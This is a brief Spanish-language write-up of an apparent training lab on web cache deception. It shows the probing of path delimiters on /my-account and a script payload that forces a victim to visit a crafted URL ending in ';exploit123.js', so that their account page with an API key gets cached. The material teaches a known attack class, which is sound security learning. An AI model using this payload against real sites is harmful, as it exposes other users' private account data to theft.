#Lab: Exploiting path delimiters for web cache deception

```
To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter.
We have provided a list of possible delimiter characters to help you solve the lab: Web cache deception lab delimiter list. 
```

Probammos varias opciones de ruta
/my-account/abc
/my-account$abc
/my-account;abc

Las primeras devuelve un not found, hasta que probamos con ;. Comprovamos que el backend utiliza ; como limitador pero la caché no.

Se utiliza el exploit server para forzar a visitar una URL manipulada:

<script>
document.location="https://LAB-ID.web-security-academy.net/my-account;exploit123.js"
</script>


